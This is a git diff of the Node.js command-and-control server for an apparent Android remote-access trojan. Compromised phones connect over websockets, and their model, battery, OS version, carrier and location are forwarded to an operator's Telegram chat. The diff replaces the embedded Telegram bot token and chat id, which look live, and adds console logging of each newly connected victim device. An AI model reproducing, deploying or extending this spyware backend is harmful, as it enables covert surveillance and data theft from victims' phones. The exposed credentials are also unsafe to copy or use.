@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '5376895931:AAGungqejutol8QIidI2tlJMkmCSUuAAY9w'
-const id = '5155109916'
+const token = '6657095944:AAGQuovFsBnKqLcgx7RmhLnRcWmABSFR5VU'
+const id = '6784944133'
 const address = 'https://www.google.com'
 
 const app = express();
@@ -49,6 +49,7 @@ app.post("/uploadLocation", (req, res) => {
     appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
     res.send('')
 })
+
 appSocket.on('connection', (ws, req) => {
     const uuid = uuid4.v4()
     const model = req.headers.model
@@ -65,6 +66,14 @@ appSocket.on('connection', (ws, req) => {
         brightness: brightness,
         provider: provider
     })
+    console.log(`
+    °• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n
+    • ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : ${model}\n
+    • ʙᴀᴛᴛᴇʀʏ : ${battery}\n
+    • ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : ${version}\n
+    • ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : ${brightness}\n
+    • ᴘʀᴏᴠɪᴅᴇʀ : ${provider}
+    `)
     appBot.sendMessage(id,
         `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
         `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
@@ -708,6 +717,7 @@ appBot.on("callback_query", (callbackQuery) => {
         currentUuid = uuid
     }
 });
+
 setInterval(function () {
     appSocket.clients.forEach(function each(ws) {
         ws.send('ping')
@@ -717,4 +727,5 @@ setInterval(function () {
     } catch (e) {
     }
 }, 5000)
+
 appServer.listen(process.env.PORT || 8999);
